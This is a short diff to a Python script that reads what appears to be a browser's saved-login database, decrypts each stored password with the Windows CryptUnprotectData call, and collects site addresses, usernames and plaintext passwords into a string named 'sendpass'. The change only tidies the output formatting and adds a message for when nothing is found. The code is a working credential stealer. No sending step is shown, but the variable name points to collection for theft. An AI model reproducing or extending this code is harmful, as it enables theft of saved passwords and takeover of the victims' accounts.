@@ -10,7 +10,11 @@ cursor.execute('SELECT origin_url, action_url, username_value, password_value FR
 for information in cursor.fetchall():
 	passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
 	if passw:
-		sendpass += '**n [*] Website-origin: ' + information[0] + '**n [*] Website-action: ' + information[1]
-		sendpass += '**n [*] Username: ' + information[2]
-		sendpass += '**n [*] Password: ' + passw + '**n'
-print sendpass
+		sendpass += ' [*] Website-origin: ' + information[0]
+		sendpass += '\n [*] Website-action: ' + information[1]
+		sendpass += '\n [*] Username: ' + information[2]
+		sendpass += '\n [*] Password: ' + passw + '\n'
+if sendpass:
+	print sendpass
+else:
+	print ' [X] No passwords found'
